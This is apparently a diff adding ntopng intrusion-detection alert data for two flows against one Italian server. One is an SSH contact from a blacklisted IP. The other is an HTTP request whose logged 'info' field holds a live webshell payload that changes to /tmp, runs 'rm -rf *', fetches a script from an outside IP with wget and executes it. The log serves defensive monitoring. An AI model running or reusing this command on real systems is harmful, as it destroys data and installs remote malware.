@@ -1,0 +1,218 @@
+{
+    "version": "0.2",
+    "timestamp": 1748884973,
+    "sharedsecret": "",
+    "alerts": [
+        {
+            "proto.ndpi": "HTTP",
+            "srv_asn": 24994,
+            "flow_risk_bitmap": 8796093042696,
+            "probe_ip": "0.0.0.0",
+            "cli_name": "",
+            "l7_cat": 5,
+            "action": "store",
+            "srv_host_pool_id": 0,
+            "srv_city_name": "Mantignano-Ugnano",
+            "community_id": "1:a/Ho8p8hJsd6AToMC8S7bCO4seE=",
+            "is_flow_alert": true,
+            "ip_version": 4,
+            "cli_os": "",
+            "cli_location_lon": 28.978399,
+            "cli_country_name": "TR",
+            "srv_ip": "212.54.224.108",
+            "cli_ip": "95.8.75.217",
+            "cli2srv_packets": 6,
+            "srv_location_lon": 11.1747,
+            "is_srv_victim": true,
+            "entity_id": 4,
+            "srv_name": "gpuserver-gabri.interhost.it",
+            "srv_port": 80,
+            "l7_error_code": 400,
+            "first_seen": 1748884968,
+            "output_snmp": 0,
+            "srv_location": 1,
+            "cli_location_lat": 41.008202,
+            "alerts_map": "8000002A0000000000",
+            "cli2srv_bytes": 568,
+            "srv_continent_name": "EU",
+            "proto": 6,
+            "cli_port": 42857,
+            "pool_id": 0,
+            "score": 270,
+            "observation_point_id": 0,
+            "input_snmp": 0,
+            "srv_location_lat": 43.799198,
+            "l7_proto": 7,
+            "require_attention": false,
+            "cli_network": 4294967295,
+            "tstamp": 1748884969,
+            "srv_os": "Windows 10",
+            "is_cli_attacker": true,
+            "cli_location": 0,
+            "is_srv_attacker": false,
+            "srv_blacklisted": false,
+            "srv_network": 2,
+            "cli_city_name": "Istanbul",
+            "is_cli_victim": false,
+            "vlan_id": 0,
+            "info": "127.0.0.1:80/shell?cd+/tmp;rm+-rf+*;wget+ 157.90.250.90/jaws;sh+/tmp/jaws",
+            "cli_blacklisted": false,
+            "json": {
+                "alerts": {
+                    "41": {
+                        "alert_generation": {
+                            "subdir": "flow",
+                            "script_key": "ndpi_url_possible_rce_injection"
+                        },
+                        "score": 150
+                    },
+                    "43": {
+                        "alert_generation": {
+                            "subdir": "flow",
+                            "script_key": "ndpi_numeric_ip_host"
+                        },
+                        "score": 10
+                    },
+                    "45": {
+                        "alert_generation": {
+                            "subdir": "flow",
+                            "script_key": "ndpi_http_suspicious_header"
+                        },
+                        "score": 100
+                    },
+                    "71": {
+                        "alert_generation": {
+                            "subdir": "flow",
+                            "script_key": "ndpi_error_code_detected"
+                        },
+                        "score": 10,
+                        "risk_id": 43
+                    }
+                },
+                "hash_entry_id": 7681180,
+                "flow_risk_info": {
+                    "3": "Possible WebShell detected",
+                    "12": "Found host 127.0.0.1",
+                    "14": "Expected 212.54.224.108, found 127.0.0.1",
+                    "43": "HTTP Error Code 400"
+                },
+                "ntopng.key": 859825650
+            },
+            "metadata": [],
+            "entity_val": "flow",
+            "ifid": 0,
+            "srv2cli_bytes": 555,
+            "cli_localhost": false,
+            "l7_master_proto": 0,
+            "srv_country_name": "IT",
+            "alert_category": 1,
+            "cli_host_pool_id": 0,
+            "srv2cli_packets": 4,
+            "cli_continent_name": "AS",
+            "cli_asn": 47331,
+            "alert_id": 41,
+            "srv_localhost": true
+        },
+        {
+            "proto.ndpi": "SSH",
+            "srv_asn": 24994,
+            "flow_risk_bitmap": 281474976710656,
+            "probe_ip": "0.0.0.0",
+            "cli_name": "",
+            "l7_cat": 100,
+            "action": "store",
+            "srv_host_pool_id": 0,
+            "srv_city_name": "Mantignano-Ugnano",
+            "community_id": "1:JRlVSM3PScPT/cmJg3CWi/QrkIE=",
+            "is_flow_alert": true,
+            "ip_version": 4,
+            "cli_os": "",
+            "cli_location_lon": 117.120003,
+            "cli_country_name": "CN",
+            "srv_ip": "212.54.224.108",
+            "cli_ip": "140.246.92.156",
+            "cli2srv_packets": 6,
+            "srv_location_lon": 11.1747,
+            "is_srv_victim": true,
+            "entity_id": 4,
+            "srv_name": "gpuserver-gabri.interhost.it",
+            "srv_port": 22,
+            "first_seen": 1748884971,
+            "output_snmp": 0,
+            "srv_location": 1,
+            "cli_location_lat": 36.651798,
+            "alerts_map": "4000000200",
+            "cli2srv_bytes": 1424,
+            "srv_continent_name": "EU",
+            "proto": 6,
+            "cli_port": 61132,
+            "pool_id": 0,
+            "score": 150,
+            "observation_point_id": 0,
+            "input_snmp": 0,
+            "srv_location_lat": 43.799198,
+            "l7_proto": 92,
+            "require_attention": true,
+            "cli_network": 4294967295,
+            "tstamp": 1748884972,
+            "srv_os": "Windows 10",
+            "is_cli_attacker": true,
+            "cli_location": 0,
+            "is_srv_attacker": false,
+            "srv_blacklisted": false,
+            "srv_network": 2,
+            "cli_city_name": "Jinan",
+            "is_cli_victim": false,
+            "vlan_id": 0,
+            "info": "SSH-2.0-OpenSSH_9.6p1 Ubuntu-3ubuntu13.5",
+            "cli_blacklisted": true,
+            "json": {
+                "alerts": {
+                    "9": {
+                        "alert_generation": {
+                            "subdir": "flow",
+                            "script_key": "blacklisted_client_contact"
+                        },
+                        "srv_blacklisted": false,
+                        "custom_cat_file": "IPsum Threat Intelligence Feed",
+                        "cli_blacklisted": true,
+                        "score": 50,
+                        "cat_blacklisted": true,
+                        "uid": 7681189
+                    },
+                    "38": {
+                        "alert_generation": {
+                            "subdir": "flow",
+                            "script_key": "remote_to_local_insecure_flow"
+                        },
+                        "ndpi_category_name": "Malware",
+                        "ndpi_breed_name": "Acceptable",
+                        "score": 100,
+                        "ndpi_category": 100,
+                        "ndpi_breed": 1
+                    }
+                },
+                "blacklist": "IPsum Threat Intelligence Feed",
+                "ntopng.key": 1630412796,
+                "hash_entry_id": 7681189,
+                "flow_risk_info": {
+                    "48": "4 sec"
+                }
+            },
+            "metadata": [],
+            "entity_val": "flow",
+            "ifid": 0,
+            "srv2cli_bytes": 2204,
+            "cli_localhost": false,
+            "l7_master_proto": 0,
+            "srv_country_name": "IT",
+            "alert_category": 1,
+            "cli_host_pool_id": 0,
+            "srv2cli_packets": 7,
+            "cli_continent_name": "AS",
+            "cli_asn": 58519,
+            "alert_id": 38,
+            "srv_localhost": true
+        }
+    ]
+}
